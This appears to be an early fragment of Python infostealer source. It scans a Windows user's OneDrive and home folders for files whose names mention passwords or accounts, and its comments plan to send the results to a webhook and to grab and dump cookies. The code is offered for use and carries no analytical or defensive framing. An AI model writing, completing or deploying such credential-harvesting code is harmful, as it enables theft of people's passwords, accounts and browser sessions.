import os

#TODO: get cookies and dump cookies, posssibly put getimportantfilesfromlocation in a different project

def isAny(array1, array2):
    foundEntries = []

    for entryARR1 in array1:
        for entryARR2 in array2:
            if entryARR1 in entryARR2:
                foundEntries.append(entryARR2)
    
    return foundEntries

def getImportantFilesFromLocation(location): # Send to webhook
    keyWords = ["password", "account", "user", "pass"]
    interestingFiles = []
    path = ""

    if os.path.exists(f"c:\\Users\\{os.getlogin()}\\OneDrive\\{location}"):
        path = f"c:\\Users\\{os.getlogin()}\\OneDrive\\{location}"
    elif os.path.exists(f"c:\\Users\\{os.getlogin()}\\{location}"):
        path = f"c:\\Users\\{os.getlogin()}\\{location}"

    for entryARR1 in keyWords:
        for entryARR2 in os.listdir(path):
            file = f"{path}\\{entryARR2}"
            if os.path.isfile(file) and file not in interestingFiles and (entryARR1 in entryARR2):
                interestingFiles.append(file)
    
    return interestingFiles

